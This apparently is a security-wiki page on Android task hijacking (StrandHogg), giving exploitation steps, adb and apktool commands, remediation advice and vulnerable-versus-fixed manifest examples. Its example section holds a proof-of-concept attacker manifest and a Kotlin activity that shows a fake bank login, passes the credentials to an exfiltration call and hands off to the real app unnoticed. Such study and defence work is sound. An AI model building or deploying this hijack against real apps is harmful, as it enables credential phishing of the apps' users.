---
title: "Task hijacking"
description: "StrandHogg-style task affinity abuse, taskAffinity and launchMode misconfiguration, and activity/overlay hijacking used to phish inside a legitimate app's task."
tags:
  - Android
  - Task Hijacking
  - StrandHogg
  - Launch Mode
---

# Task hijacking

!!! note "What this page is doing"
    Task hijacking exploits how Android groups activities into tasks, not a bug in any single activity. A malicious app with no special permission can insert itself into — or in front of — the victim's task, so the user believes they're looking at the real app while a different activity is actually in front.

## Explanation

Android groups activities into **tasks**, identified by an affinity string (`taskAffinity`, defaulting to the app's package name). `launchMode` and flags like `FLAG_ACTIVITY_NEW_TASK` control whether a new activity joins an existing task or starts a fresh one. Two misconfigurations turn this into an attack surface:

- **`taskAffinity` set to another app's package name**, combined with `launchMode="singleTask"`. When the malicious activity is launched, Android — following the affinity, not the actual owning package — places it at the root of (or on top of) the *victim's* task. The next time the user taps the victim app's icon, or switches back to its task, they land on the attacker's activity instead, because it's now sitting on top of that task's back stack. This is the mechanism behind **StrandHogg**: a legitimate-looking permission prompt or login screen rendered by the attacker, inside what the user believes is the trusted app's task, with the trusted app's icon and name in the task switcher.
- **Overlay/activity hijacking more broadly**: an app that monitors the foreground task (via `getRunningTasks`/`usageStats`, or just timing) and launches its own activity the instant it detects the target app opening, so the fake screen appears to be part of the normal launch sequence. A full-screen `SYSTEM_ALERT_WINDOW` overlay achieves a similar visual effect without even needing the task-affinity trick, though it depends on an overlay permission the user has to have granted.

The user-visible result is the same either way: a convincing phishing surface — fake login, fake permission dialog, fake payment screen — that appears to belong to an app the user trusts, inside its own task, with no URL bar or other context to give it away.

## Exploitation

1. Identify a target app and inspect its manifest for activities with an explicit `taskAffinity` (especially one matching a *different* package) or `launchMode="singleTask"`/`singleInstance"` on an entry point activity.
2. Build a malicious app with an activity whose `taskAffinity` is set to the victim's package name and `launchMode="singleTask"`.
3. Have the malicious app's activity auto-launch (from a `BOOT_COMPLETED` receiver, a background service, or simply when the malicious app itself is opened) before the user opens the victim app.
4. When the user taps the victim app's icon from the launcher, Android resolves the task by affinity and brings the attacker's activity to the foreground instead of the victim's actual launch activity — displaying a phishing UI styled to match the victim app, then handing off (or capturing credentials) before finishing itself and revealing the real app underneath.

## Steps

```bash
# 1. Pull the target's manifest and look for affinity/launchMode red flags
apktool d target.apk -o target_src
grep -n "taskAffinity\|launchMode" target_src/AndroidManifest.xml

# 2. Confirm the main launcher activity and its declared affinity
adb shell dumpsys package <package> | grep -A5 "android.intent.action.MAIN"

# 3. Check the current task structure to understand what "joining" the
#    victim's task actually looks like before building the PoC
adb shell dumpsys activity activities | grep -A20 "Stack #"

# 4. Build and install a minimal PoC app (manifest below) whose activity
#    declares the victim's taskAffinity and singleTask launch mode
apktool b poc_src -o poc.apk
apksigner sign --ks debug.keystore poc.apk
adb install poc.apk

# 5. Launch the PoC activity directly, then switch to the victim app from
#    the launcher and observe which activity actually comes to the front
adb shell am start -n com.attacker.poc/.HijackActivity
adb shell am start -n <victim_package>/.LauncherActivity

# 6. Confirm from the task list which app is actually on top — the PoC
#    activity appearing under the victim's task name is the finding
adb shell dumpsys activity activities | grep -iE "taskAffinity|realActivity"
```

## Remediation

- Set `android:taskAffinity=""` on every activity, unless activities are deliberately meant to share a task, in which case the affinity should point at the app's **own** package, never be left to collide with another app's.
- Avoid `launchMode="singleTask"`/`"singleInstance"` unless the activity genuinely needs to be a unique, reusable entry point; prefer `standard` or `singleTop` and manage the back stack explicitly with intent flags instead.
- When starting a new task programmatically, always pair `FLAG_ACTIVITY_NEW_TASK` with a clear, intentional affinity rather than relying on defaults — and call `taskAffinity` out explicitly in code review for any activity that sets a custom launch mode.
- Add `FLAG_ACTIVITY_CLEAR_TASK` where appropriate (e.g. after logout) so a stale, possibly-hijacked back stack isn't reused on the next launch.
- On API 29+ `allowTaskReparenting` should be left at its default (`false`) for sensitive activities — reparenting is the exact mechanism StrandHogg-style attacks ride on.
- Target a current `targetSdkVersion` — Android has hardened task reparenting across versions, and apps still targeting old API levels remain more exposed to the classic StrandHogg technique.
- For overlay-based hijacking specifically, treat `SYSTEM_ALERT_WINDOW` as a sensitive permission: detect unexpected overlay windows at runtime where feasible, and never render secrets without `FLAG_SECURE`/anti-overlay checks on the screens that matter most (login, payment).

## Example

**Vulnerable — manifest entry with an exploitable task affinity:**

```xml
<!-- Victim app's AndroidManifest.xml -->
<activity
    android:name=".LoginActivity"
    android:exported="true"
    android:launchMode="singleTask"
    android:taskAffinity="com.victim.bank" />
```

```xml
<!-- Attacker's manifest: claims the SAME affinity as the victim -->
<activity
    android:name=".HijackActivity"
    android:exported="true"
    android:launchMode="singleTask"
    android:taskAffinity="com.victim.bank"
    android:theme="@style/Theme.FullScreenPhish" />
```

**Exploit — the attacker's activity is inserted into the victim's task:**

```kotlin
// HijackActivity.kt — styled to be visually indistinguishable from the
// victim bank app's real login screen
class HijackActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.fake_login_matching_victim_theme)
    }

    fun onFakeLoginSubmit(username: String, password: String) {
        exfiltrateCredentials(username, password)
        // Hand off to the real app so the user notices nothing
        startActivity(Intent().setClassName(
            "com.victim.bank", "com.victim.bank.LoginActivity"
        ))
        finish()
    }
}
```

```bash
# Triggered ahead of time (e.g. from a boot receiver), then the user taps
# the victim app's own launcher icon and lands on HijackActivity instead
adb shell am start -n com.attacker.poc/.HijackActivity
```

**Fix — affinity isolated to the app's own package, task cleared on re-entry:**

```xml
<!-- Victim app's AndroidManifest.xml -->
<activity
    android:name=".LoginActivity"
    android:exported="true"
    android:launchMode="standard"
    android:taskAffinity="" />
```

```kotlin
// Explicit, intentional task handling instead of relying on defaults
val intent = Intent(this, LoginActivity::class.java)
intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
startActivity(intent)
```
